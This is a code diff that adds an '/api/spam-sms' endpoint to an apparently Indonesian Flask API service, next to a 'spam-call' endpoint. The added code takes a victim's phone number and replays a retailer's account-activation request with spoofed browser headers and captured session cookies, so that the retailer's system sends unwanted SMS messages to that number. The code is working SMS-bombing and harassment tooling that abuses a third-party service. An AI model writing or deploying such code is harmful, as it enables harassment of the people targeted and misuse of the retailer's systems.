@@ -1525,6 +1525,32 @@ class PinterestDl(Resource):
                 "mssg": 404
             }
 
+@app.route('/api/spam-sms'), methods=['GET'])
+def spam_sms():
+    nomor = request.args.get("nomor")
+    apikey = request.args.get("apikey")
+    if not nomor:
+        return jsonify({
+		"status": False,
+		"mssg": "input parameter 'nomor'"
+	})
+    if not apikey or not is_apikey_valid(apikey):
+        return jsonify({"error": "Invalid or expired API key, plese download new apikey"}), 401
+
+    fetch = requests.post("https://www.mothercare.co.id/privilege_activation/ajax/validateprivilege",headers = {'Host': 'www.mothercare.co.id','content-length': '48','sec-ch-ua': '"Google Chrome";v="115", "Chromium";v="115", "Not=A?Brand";v="24"','accept': '*/*','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-requested-with': 'XMLHttpRequest','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform': '"Android"','origin': 'https://www.mothercare.co.id','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.mothercare.co.id/customer/account/create/',},data = {"email":"tootoovex@risu.be","phone":"+"+nomor,},cookies = {'cookie': 'PHPSESSID=385a8e552bfdf6bce03fa0d4703dff8f;X-Magento-Vary=6eb1a85fd230ac0734d5c6dbf29c9fab4c14e22e;_hjSession_1407191=eyJpZCI6IjljNjBlMmM3LTQ3ZGUtNDYyMy04NTZiLTllMGE5YjFhMzJlMSIsImMiOjE3MTIzNjE3Mzc1OTMsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=;form_key=92FPuMSvE1sdQJ3B;mage-cache-storage={};mage-cache-storage-section-invalidation={};mage-cache-sessid=true;mage-messages=;_gcl_au=1.1.1698650236.1712361754;form_key=92FPuMSvE1sdQJ3B;recently_viewed_product={};recently_viewed_product_previous={};recently_compared_product={};recently_compared_product_previous={};product_data_storage={};_ga=GA1.1.1453237401.1712361755;_fbp=fb.2.1712361756815.1883026824;_tt_enable_cookie=1;_ttp=fAme1TCbtIJl4aCmyLbtKFnMeLk;private_content_version=ce0927a7576674f1feb4a35f7c11c53c;section_data_ids={%22messages%22:1712361765%2C%22company%22:1712361765%2C%22personal-data%22:1712361765};_hjSessionUser_1407191=eyJpZCI6IjU3MzM3M2U1LWIwNjctNWY2MS1hZjc3LWIyMzA2YTVhMWViZiIsImNyZWF0ZWQiOjE3MTIzNjE3Mzc1ODQsImV4aXN0aW5nIjp0cnVlfQ==;klv_mage={"expire_sections":{"customerData":1712362439}};_ga_WVX2TL3S4L=GS1.1.1712361755.1.1.1712361848.35.0.0'}).text
+    if "success" in fetch:
+        return jsonify({
+		"creator": "AmmarBN",
+		"status": True,
+		"mssg": f"Berhasil mengirim Spam Sms Ke {nomor}"
+	})
+    else:
+	return jsonify({
+		"creator": "AmmarBN",
+		"status": False,
+		"mssg": f"Gagal mengirim Spam Sms Ke {nomor}"
+	})
+
 @app.route('/api/spam-call', methods=['GET'])
 def spam_call():
     nomor = request.args.get("nomor")
